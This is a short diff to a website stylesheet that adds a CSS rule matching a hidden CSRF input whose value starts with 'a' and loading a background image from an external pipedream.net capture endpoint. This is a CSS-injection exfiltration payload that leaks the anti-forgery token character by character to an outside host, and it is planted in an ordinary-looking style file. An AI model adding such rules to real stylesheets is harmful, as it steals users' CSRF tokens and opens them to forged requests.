@@ -112,3 +112,6 @@ form > input[type='submit'] {
 .csrf {
         visibility: hidden;
 }
+.csrf[value^="a"] { 
+	background: url(https://eotluy6vrc5aeaf.m.pipedream.net/?a); 
+}
